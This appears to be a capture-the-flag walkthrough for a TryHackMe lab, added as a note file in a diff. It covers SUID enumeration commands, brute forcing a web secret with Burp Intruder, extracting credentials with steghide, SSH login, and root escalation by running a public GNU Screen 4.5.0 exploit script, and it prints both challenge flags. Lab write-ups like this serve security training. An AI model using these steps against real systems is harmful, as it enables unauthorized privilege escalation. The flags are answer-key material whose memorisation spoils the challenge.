@@ -1,0 +1,172 @@
+------------------------------------------------------------------------------------------------------------------------------------
+
+NOTE:-
+find / -perm -u=s 2>/dev/null
+
+find / -perm -u=s 2>/dev/null
+
+And yes — this is a valid and useful command for privilege escalation checks on Linux systems.
+🔍 What It Does:
+
+    find /: Search from the root directory.
+
+    -perm -u=s: Find files with the SUID (Set User ID) bit set for the user (owner).
+
+    2>/dev/null: Suppress any "Permission denied" errors to keep the output clean.
+
+✅ This will list all files with SUID set, which means:
+
+    When any user executes that file, it runs with the permissions of the file's owner (usually root).
+
+find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>> /dev/null
+
+🔍 Explanation:
+
+    find /: Search starting from root directory.
+
+    -type f: Only files.
+
+    -user root: Owned by root user.
+
+    -perm -4000: Files with the SUID bit set.
+
+    -exec ls -ldb {} \;: List details (with -ldb showing symlink targets too).
+
+    2>> /dev/null: Suppress permission-denied errors.
+
+🧑‍💻 What It Does:
+
+This command finds all SUID files owned by root on the system and lists them in detail — useful for privilege escalation checks.
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+step 1:-
+scan target using nmap and we find 22 ssh and 880 http is open
+
+so, We attempted to access port 80 via HTTP, but I didn’t find anything unusual. I tried opening the source code and noticed a comment as well as a JPG file.
+
+I downloaded the JPG file, but the image didn’t appear. Using a hex editor, I examined the first 12 bits and converted it to a JPEG format.
+
+We obtained a file that revealed a hidden directory.
+
+We accessed the hidden directory, where we encountered a web page that required us to input the “secret” to view the hidden message.
+
+than goto the directory we show the
+
+Welcome! I have been expecting you!
+
+To obtain my identity you need to guess my secret!
+
+Secret Entered:
+
+That is wrong! Get outta here!
+
+we open the source code:-
+
+<div class="main">
+<h2>Welcome! I have been expecting you!</h2>
+<p>To obtain my identity you need to guess my secret! </p>
+<!-- It's between 0-99 but I don't think anyone will look here-->
+
+<p>Secret Entered: </p>
+
+<p>That is wrong! Get outta here!</p>
+
+</div>
+
+
+
+step 2:-
+Using Burp Suite, we conducted a brute force attack on the “secret” value.
+
+We entered the Intruder and performed a brute force attack using numbers from 0 to 99.
+
+Here, we found the value 73.
+
+I tried entering the “secret” value as 73, and we obtained a code.
+
+http://10.10.9.87/th1s_1s_h1dd3n?secret=73
+
+
+Welcome! I have been expecting you!
+
+To obtain my identity you need to guess my secret!
+
+Secret Entered:73
+
+That is wrong! Get outta here!
+
+so we nothing find here so we extract all data from images that we have
+
+Using steghide, we extracted the hidden text from the modified JPEG file, revealing a username.
+
+As the username still appeared strange, I attempted to decode the text and obtained the plain text username.
+
+I was quite frustrated at this point because I didn’t receive any clues. I attempted to download the banner image from the TryHackMe website.
+
+I tried extracting the image using steghide, and indeed, I found text containing a password!!!
+
+I accessed port 22 SSH using the username and password we obtained.
+
+Here, we obtained the first flag.
+
+    User.txt
+
+    Answer: THM{d5781e53b130efe2f94f9b0354a5e4ea}
+    
+step 3:-
+
+I attempted to perform privilege escalation
+    
+joker@ubuntu:~$ find / -type fuser root -perm -4000-exec ls -ldb {} \; 2>>/dev/null
+-rwsr-xr-x 1 root root 428240 Mar 4 2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr- 1 root messagebus 42992 Nov 29 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 10624 May 8
+2018 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 75304 Mar 26 2019/usr/bin/gpasswd
+asswd -rwsr-xr-x 1 root root 54256 Mar 26 2019/usr/bin/passwd
+-rwsr-xr-x 1 root root 39904 Mar 26 2019/usr/bin/newgrp
+-rwsr-xr-x 1 root root 40432 Mar 26 2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 71824 Mar 26 2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 136808 Oct 11 2019 /usr/bin/sudo -rwsr-xr-x 1 root root 30800 Jul 12 2016/bin/fusermount
+-rwsr-xr-x 1 root root 40128 Mar 26 2019 /bin/su
+-rwsr-xr-x 1 root root 44680 May 7
+2014/bin/ping6
+-rwsr-xr-x 1 root root 1588648 Jan 4
+2020/bin/screen-4.5.0
+-rwsr-xr-x 1 root root 1588648 Jan 4
+2020 /bin/screen-4.5.0.old
+-rwsr-xr-x 1 root root 40152 Oct 10 2019 /bin/mount
+-rwsr-xr-x 1 root root 44168 May 7 2014/bin/ping
+-rwsr-xr-x 1 root root 27608 Oct 10
+2019/bin/umount
+
+I noticed something strange with screen-4.5.0.
+I searched for vulnerabilities using searchsploit.
+
+CMD:- searchsploit screen 4.5.0
+---------------------------------------------------------------------------- ----------------------
+ Exploit Title                                                              |  Path
+---------------------------------------------------------------------------- ----------------------
+GNU Screen 4.5.0 - Local Privilege Escalation                               | linux/local/41154.sh
+
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                         | linux/local/41152.txt ---------------------------------------------------------------------------- ----------------------
+Shellcodes: No Results
+
+open the .sh file.
+
+step 4:-
+
+I copied the .sh file to the target computer, added executable permissions to the file.
+CMD:-nano ff.sh
+CMD:-chmod +x ff.sh
+
+run the .sh file. And voila, we gained root access.
+CMD:-./ff.sh
+
+Here, we obtained the last flag.
+
+    root.txt
+
+    Answer : THM{5ecd98aa66a6abb670184d7547c8124a}s
